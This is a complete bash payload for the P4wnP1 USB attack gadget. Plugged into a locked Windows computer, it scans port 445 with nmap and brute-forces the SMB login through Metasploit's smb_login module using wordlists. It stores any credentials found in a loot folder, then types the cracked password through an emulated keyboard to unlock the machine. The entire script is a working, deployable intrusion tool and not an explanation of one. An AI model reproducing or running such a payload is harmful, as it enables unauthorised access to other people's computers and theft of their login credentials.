#!/bin/bash

# Brute force windows login based via SMB
# Based on lockpicker from: https://pentestit.de/smb-brute-force-mit-p4wnp1-a-l-o-a/ and Jackalope from: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/Jackalope
# You need to setup P4wnP1 USB Gadget Settings as RNDIS_ETHERNET and HID keyboard
# Copy this script to "/usr/local/P4wnP1/scripts/"
# Create a trigger to start the bash script "smbrute.sh" when DHCP lease issued.

# Requirements 
# Nmap
# Metasploit - msfconsole
# Wordlists: usernames file: users.txt passwords file: passwords.txt should be placed in "/usr/local/P4wnP1/scripts/wordlists"


WORDLIST_DIR=/usr/local/P4wnP1/scripts/wordlists
LOOTBASE=/usr/local/P4wnP1/www/loot/smbrute/

# Get target machine hostname
TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4); 

# Get target machine IP Address
TARGET_IP=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f3);

# Create Loot directory
COUNT=$(ls -lad $LOOTBASE/$TARGET_HOSTNAME* | wc -l)
COUNT=$((COUNT+1))
LOOTDIR=$LOOTBASE/$TARGET_HOSTNAME-$COUNT
mkdir -p $LOOTDIR

# Detect if port 445 is open using nmap
echo "[*] Checking if SMB port is open..."
nmap -p 445 -Pn $TARGET_IP > $LOOTDIR/nmap_results.txt
if ! grep --quiet "445.*open" $LOOTDIR/nmap_results.txt;
then
	echo "[!] Port 445 not found!" >> $LOOTDIR/log.txt
	exit
fi

echo "[+] SMB Port is open."

# Brute force smb using msfconsole smb_login module
echo "[*] Brute forcing..."
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set STOP_ON_SUCCESS true; set RHOSTS $TARGET_IP; set USER_FILE $WORDLIST_DIR/users.txt; set PASS_FILE $WORDLIST_DIR/passwords.txt; run; exit" > $LOOTDIR/msfconsole.txt

# Check if password found
if ! grep --quiet "Success" $LOOTDIR/msfconsole.txt;
then
	echo "[!] Payload failed, no logins found..." >> $LOOTDIR/log.txt
	echo "[!] Payload failed, no logins found..." 
	P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
	exit
fi
grep "Success" $LOOTDIR/msfconsole.txt | cut -d: -f4-5 > $LOOTDIR/loot.txt
echo "[+] Logins found!" 

# Delete temp files
rm $LOOTDIR/nmap_results.txt
rm $LOOTDIR/msfconsole.txt
echo "[+] Finished!"

# Create HID script 
password=$(cat $LOOTDIR/loot.txt | cut -d ":" -f2 | tr -d "'")
echo "layout(\"us\")" > /usr/local/P4wnP1/HIDScripts/smbrute.js
echo "press(\"ESC\")" >>/usr/local/P4wnP1/HIDScripts/smbrute.js
echo "delay(1000)" >>/usr/local/P4wnP1/HIDScripts/smbrute.js
echo "type(\"${password}\")" >> /usr/local/P4wnP1/HIDScripts/smbrute.js
echo "press(\"ENTER\")" >>/usr/local/P4wnP1/HIDScripts/smbrute.js

# Run HID scrtit (try to login with found password)
P4wnP1_cli hid run -n smbrute.js >/dev/null
sleep 5

# Delete HID script
rm /usr/local/P4wnP1/HIDScripts/smbrute.js
P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
